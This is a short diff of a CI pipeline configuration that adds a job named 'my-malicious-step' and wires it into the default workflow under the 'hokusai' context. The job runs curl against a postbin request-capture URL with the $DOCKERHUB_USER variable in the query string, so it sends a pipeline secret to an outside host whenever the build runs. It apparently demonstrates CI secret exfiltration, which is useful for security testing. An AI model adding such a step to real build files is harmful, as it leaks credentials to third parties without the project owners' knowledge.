@@ -77,6 +77,10 @@ jobs:
           name: push schema changes
           command: node scripts/push-schema-changes.js
 
+  my-malicious-step:
+    steps:
+      - run: curl https://www.toptal.com/developers/postbin/1661275748486-1824831354897?example=$DOCKERHUB_USER
+
 workflows:
   default:
     jobs:
@@ -86,7 +90,6 @@ workflows:
 
       - my-malicious-step:
           context: hokusai
-          run: curl https://www.toptal.com/developers/postbin/1661275748486-1824831354897?example=$DOCKERHUB_USER
 
       - yarn/type-check:
           <<: *not_staging_or_release
